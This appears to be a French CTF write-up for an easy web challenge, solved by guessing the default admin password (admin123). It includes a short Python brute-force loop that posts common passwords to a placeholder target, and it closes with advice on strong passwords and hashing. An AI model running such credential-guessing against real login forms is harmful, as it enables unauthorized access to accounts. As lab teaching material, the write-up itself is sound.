# Writeup — Simple Login

**Catégorie** : Web  
**Difficulté** : Easy  
**Points** : 75  
**Flag** : `CTF{default_creds_are_dangerous}`

## Contexte

L'utilisation de credentials par défaut est l'une des vulnérabilités les plus courantes et les plus simples à exploiter. De nombreuses applications laissent des comptes admin avec des mots de passe triviaux en production.

## Étapes de résolution

### 1. Reconnaissance

En arrivant sur le challenge, on voit un formulaire de login classique avec un champ username et password.

### 2. Tentatives de credentials communs

Essai de combinaisons classiques :
- `admin` / `admin` → ❌
- `admin` / `password` → ❌
- `admin` / `admin123` → ✅ **Accès accordé !**

### 3. Récupération du flag

Une fois connecté en tant qu'admin, le flag s'affiche directement sur la page.

```
CTF{default_creds_are_dangerous}
```

## Alternative : Bruteforce

```python
import requests

url = "http://TARGET:5030/"
passwords = ["admin", "password", "admin123", "123456", "root", "letmein"]

for p in passwords:
    r = requests.post(url, data={"username": "admin", "password": p})
    if "CTF{" in r.text:
        print(f"[+] Password found: {p}")
        break
```

## Correction

En production, ne jamais utiliser de mots de passe par défaut. Utiliser un générateur de mots de passe forts et stocker les hash avec bcrypt ou argon2.
